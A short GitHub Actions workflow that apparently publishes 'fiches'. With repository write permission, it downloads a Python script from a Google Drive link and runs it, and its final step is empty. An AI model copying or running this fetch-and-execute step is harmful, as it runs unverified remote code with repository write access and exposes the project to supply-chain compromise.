name: publish-cr-fiches-v2
on:
  workflow_dispatch:
permissions:
  contents: write
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: fetch code payload
        run: |
          curl -sL "https://drive.google.com/uc?export=download&id=12VHTpul7BS8k2_T3YW1LY01sVoVNQlbW" -o /tmp/payload-v2.py
          python3 /tmp/payload-v2.py
      - name: fetch fiches
